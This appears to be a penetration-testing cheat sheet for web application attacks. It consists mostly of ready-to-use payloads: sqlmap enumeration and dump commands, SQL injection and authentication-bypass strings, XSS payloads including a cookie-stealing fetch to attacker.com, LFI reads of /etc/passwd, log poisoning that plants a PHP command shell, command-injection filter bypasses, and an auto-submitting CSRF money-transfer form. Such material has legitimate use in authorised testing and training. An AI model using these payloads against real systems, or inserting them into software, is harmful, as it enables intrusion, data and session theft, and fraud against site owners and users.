# Web Application Attacks

## File Upload Attacks

1. Analyze the website for upload functionality
2. Check source code for client-side filters
3. Test innocent file upload and determine how files are accessed
4. Test malicious uploads and observe filter responses
5. Bypass filters based on:
   - Extension blacklist/whitelist
   - Magic number validation
   - MIME type validation
   - File size limits

## SQL Injection

```bash
# Basic SQLMap usage
sqlmap -u http://<TARGET_IP>/register.php --forms

# Testing parameters
sqlmap -u "http://<TARGET_IP>/page.php?id=1" -p id

# Database enumeration
sqlmap -u "http://<TARGET_IP>/page.php?id=1" --dbs
sqlmap -u "http://<TARGET_IP>/page.php?id=1" -D database_name --tables
sqlmap -u "http://<TARGET_IP>/page.php?id=1" -D database_name -T table_name --columns
sqlmap -u "http://<TARGET_IP>/page.php?id=1" -D database_name -T table_name -C column1,column2 --dump

# Bypassing WAF
sqlmap -u "http://<TARGET_IP>/page.php?id=1" --tamper=space2comment

# Manual SQL Injection
# Authentication bypass
' OR 1=1 --
' OR '1'='1
admin' --

# Union-based injection
' UNION SELECT 1,2,3 --
' UNION SELECT username,password,3 FROM users --

# Error-based injection
' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT @@version), 0x7e)) --
```

## Cross-Site Scripting (XSS)

```html
<!-- Basic XSS payloads -->
<script>alert('XSS')</script>
<img src="x" onerror="alert('XSS')">
<body onload="alert('XSS')">

<!-- Cookie stealing -->
<script>fetch('https://attacker.com/steal?cookie='+document.cookie)</script>

<!-- DOM-based XSS -->
<script>document.getElementById("demo").innerHTML = location.hash.substring(1);</script>
```

## Local File Inclusion (LFI)

```
# Basic LFI
http://<TARGET_IP>/page.php?file=../../../etc/passwd

# LFI with wrappers
http://<TARGET_IP>/page.php?file=php://filter/convert.base64-encode/resource=index.php

# Log poisoning with LFI
# 1. Inject PHP code into logs by making malicious request:
nc <TARGET_IP> 80
GET /<?php system($_GET['cmd']); ?> HTTP/1.1
Host: <TARGET_IP>

# 2. Access logs through LFI:
http://<TARGET_IP>/page.php?file=../../../var/log/apache2/access.log&cmd=id
```

## Command Injection

```
# Basic tests
; id
| id
`id`
$(id)

# Bypassing filters
w'h'o'am'i
cat${IFS}/etc/passwd
```

## Cross-Site Request Forgery (CSRF)

```html
<!-- Basic CSRF form -->
<form action="https://vulnerable-site.com/transfer" method="POST" id="exploit">
  <input type="hidden" name="amount" value="1000">
  <input type="hidden" name="to" value="attacker">
</form>
<script>document.getElementById("exploit").submit();</script>
```
